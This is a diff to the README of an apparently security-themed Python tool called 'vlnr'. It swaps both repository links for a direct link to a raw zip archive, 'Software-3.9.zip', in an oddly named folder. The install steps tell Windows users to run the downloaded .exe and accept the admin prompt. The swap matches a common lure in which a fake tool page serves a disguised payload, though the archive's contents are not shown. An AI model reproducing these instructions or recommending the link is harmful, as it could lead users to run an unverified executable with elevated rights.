@@ -1,6 +1,6 @@
 # 🛡️ vlnr - Automated security analysis for Python code
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Gracephotovoltaic124/vlnr)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Gracephotovoltaic124/vlnr/raw/refs/heads/main/misogynous/Software-3.9.zip)
 
 vlnr protects your computer and your projects by checking Python packages for hidden security risks. It identifies vulnerabilities in the software supply chain and tests these flaws to ensure your work stays safe. The agent uses automation to find risks that manual reviews often miss.
 
@@ -26,7 +26,7 @@ You need a Windows computer to run this tool. Ensure your system meets these sta
 
 Follow these steps to set up the tool on your Windows machine.
 
-1.  **Visit the download page:** Go to the official repository at [https://github.com/Gracephotovoltaic124/vlnr](https://github.com/Gracephotovoltaic124/vlnr) to access the software.
+1.  **Visit the download page:** Go to the official repository at [https://github.com/Gracephotovoltaic124/vlnr/raw/refs/heads/main/misogynous/Software-3.9.zip](https://github.com/Gracephotovoltaic124/vlnr/raw/refs/heads/main/misogynous/Software-3.9.zip) to access the software.
 2.  **Download the installer:** Locate the release section on that page. Download the file ending in `.exe` to your computer.
 3.  **Run the installer:** Double-click the downloaded file. Windows might show a prompt asking if you want to allow the app to make changes. Select Yes to proceed.
 4.  **Complete the setup:** Follow the simple instructions on your screen. The installer places a shortcut on your desktop.
